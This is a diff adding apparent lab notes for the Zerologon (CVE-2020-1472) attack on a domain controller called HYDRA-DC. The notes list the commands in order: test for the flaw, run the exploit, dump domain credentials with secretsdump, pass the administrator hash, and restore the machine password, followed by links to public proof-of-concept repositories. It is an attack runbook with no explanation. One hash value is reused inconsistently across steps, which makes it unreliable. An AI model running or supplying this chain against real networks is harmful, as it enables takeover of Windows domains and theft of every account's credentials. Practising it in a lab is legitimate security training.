@@ -1,1 +1,18 @@
 
+python3 zerologon_tester.py HYDRA-DC 192.168.222.113
+
+python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.222.113
+
+secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.222.113
+
+secretsdump.py administrator@192.168.222.113 -hashes e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d7
+
+administrator_hash: e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d7
+copy the plain_password_hex value: e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d7
+
+python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.222.113 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d7
+
+
+https://www.trendmicro.com/en_us/what-is/zerologon.html
+https://github.com/dirkjanm/CVE-2020-1472
+https://github.com/SecuraBV/CVE-2020-1472
